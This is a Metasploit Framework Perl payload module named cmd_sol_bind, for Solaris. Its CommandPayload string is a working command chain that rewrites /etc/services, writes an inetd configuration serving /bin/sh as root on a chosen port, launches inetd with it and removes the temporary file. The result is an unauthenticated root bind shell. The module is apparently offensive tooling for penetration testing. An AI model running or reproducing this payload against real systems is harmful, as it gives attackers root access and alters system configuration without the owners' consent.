package Msf::Payload::cmd_sol_bind;
use strict;
use base 'Msf::CommandPayload';

my $info =
{
    Name         => 'cmd_sol_bind',
    Version      => '1.0',
    Description  => 'Listen for connection and spawn a shell',
    Author       => 'H D Mooore <hdm[at]metasploit.com> [Artistic License]',
    Arch         => [  ],
    Priv         => 0,
    OS           => [ 'solaris' ],
    Keys         => ['cmd'], 
    Multistage   => 0,
    Type         => 'bind_shell',
    Size         => '',
    UserOpts     =>
        {
            'LPORT' => [1, 'PORT', 'Listening port for bind shell'],
        },
        
    CommandPayload =>
    "grep -v msfbind /etc/services>/tmp/.msf_svcs;".
    "echo msfbind [>LPORT<]/tcp>>/tmp/.msf_svcs;".
    "cp /tmp/.msf_svcs /etc/services;".
    "echo msfbind stream tcp nowait root /bin/sh sh>/tmp/.msf_inet;".
    "/usr/sbin/inetd -s /tmp/.msf_inet;".
    "rm /tmp/.msf_inet;",
};

sub new {
    my $class = shift;
    my $self = $class->SUPER::new({'Info' => $info}, @_);
    return($self);
}
